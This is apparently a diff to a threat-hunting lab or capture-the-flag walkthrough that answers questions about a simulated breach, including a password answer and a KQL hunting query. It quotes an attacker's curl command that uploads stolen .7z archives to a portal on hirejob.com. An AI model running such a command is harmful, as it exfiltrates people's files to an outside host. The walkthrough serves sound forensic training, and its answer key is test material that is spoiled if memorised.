@@ -292,5 +292,18 @@ The password is shown from the previous questions.<br><br>
 **Answer: thruthW!llS3tUfree**<br><br>
 
 **Q30 After compressing all the stolen data into .7z files, the attackers exfiltrated the data by uploading it to a custom portal on their website. What is the full command the attackers ran to do this?**<br><br>
+The fourth result from the query shows the full command to exfiltrate the data.<br><br>
 
+**Answer: curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil_processor/upload.php**<br><br>
 
+**Q31 What domain was the stolen data uploaded to?**<br><br>
+From the answer in previous question, the domain can be retrieved.<br><br>
+
+**Answer: hirejob.com**<br><br>
+
+**Q32 Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)**<br><br>
+Can run the query to see if the domain hirejob.com appears in any other command line.
+
+ProcessEvents
+| where process_commandline has "hirejob.com"
+**Answer:  no.**<br><br>
